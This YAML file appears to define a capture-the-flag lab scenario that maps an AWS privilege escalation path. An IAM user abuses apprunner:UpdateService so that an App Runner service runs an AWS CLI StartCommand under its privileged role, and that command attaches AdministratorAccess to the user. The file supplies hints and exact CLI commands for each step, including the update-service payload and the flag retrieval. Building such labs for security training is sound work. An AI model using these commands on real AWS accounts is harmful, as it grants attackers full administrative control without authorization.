attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-apprunner-002-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has apprunner:UpdateService permission on the target App Runner
        service, which has a privileged role attached with IAM modification capabilities.

    - id: apprunner-service
      label: "App Runner Service"
      type: resource
      subType: apprunner-service
      arn: "arn:aws:apprunner:{region}:{account_id}:service/pl-prod-apprunner-002-to-admin-target-service"
      description: >
        An existing App Runner service running a benign nginx container. It has a
        privileged IAM role attached that grants IAM modification permissions. By
        updating the service image and StartCommand, an attacker can execute arbitrary
        AWS CLI commands with the service role's permissions when the service restarts.

    - id: target-role
      label: "Privileged Service Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-apprunner-002-to-admin-target-role"
      description: >
        The IAM role attached to the App Runner service. It has administrator-level
        permissions including iam:AttachUserPolicy. When the service is updated to run
        the AWS CLI container with a crafted StartCommand, it executes IAM commands
        as this role, enabling the attacker to grant themselves administrative access.
        Once admin-equivalent permissions are attached to the starting user, the
        attacker reads the scenario CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/apprunner-002-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: apprunner-service
      label: "apprunner:UpdateService"
      description: >
        Update the App Runner service configuration to replace the container image
        with the AWS CLI image and set a StartCommand that attaches AdministratorAccess
        to the starting user.
      hints:
        - "Call apprunner:UpdateService with a modified source configuration: swap the image to public.ecr.aws/aws-cli/aws-cli:latest and set StartCommand to the aws CLI arguments you want executed (e.g., 'iam attach-user-policy --user-name ... --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'). The service role's permissions execute that command when the container starts."
        - "After triggering the update, poll apprunner:DescribeService until the status returns RUNNING (typically 3-5 minutes) — that confirms the StartCommand has already executed. Wait at least 15 seconds after RUNNING for IAM policy propagation before verifying the new permissions."
        - "Browse to https://pathfinding.cloud/paths/apprunner-002 for technique details and to see the full attack path."
      commands:
        - description: "Get current service ARN and configuration"
          command: "aws apprunner list-services --query 'ServiceSummaryList[?ServiceName==`pl-prod-apprunner-002-to-admin-target-service`].[ServiceArn]' --output text"
        - description: "Update the service with malicious image and StartCommand"
          command: "aws apprunner update-service --service-arn <SERVICE_ARN> --source-configuration '{\"ImageRepository\":{\"ImageIdentifier\":\"public.ecr.aws/aws-cli/aws-cli:latest\",\"ImageConfiguration\":{\"StartCommand\":\"iam attach-user-policy --user-name pl-prod-apprunner-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"},\"ImageRepositoryType\":\"ECR_PUBLIC\"}}'"
        - description: "Wait for the service to update and execute the command"
          command: "aws apprunner describe-service --service-arn <SERVICE_ARN> --query 'Service.Status'"

    - from: apprunner-service
      to: target-role
      label: "runs with role"
      description: >
        The App Runner service executes with the privileged IAM role attached to it.
        When the service starts with the new configuration, all AWS API calls are made
        using this role's credentials. The AWS CLI container executes the StartCommand
        as the privileged role, attaching the AdministratorAccess managed policy to
        the starting user, granting full administrative access to the AWS account.
      hints: []
      commands:
        - description: "Verify administrator access with original starting user credentials"
          command: "aws iam list-users --max-items 1"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the parameter name /pathfinding-labs/flags/apprunner-002-to-admin to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/apprunner-002-to-admin --query 'Parameter.Value' --output text"
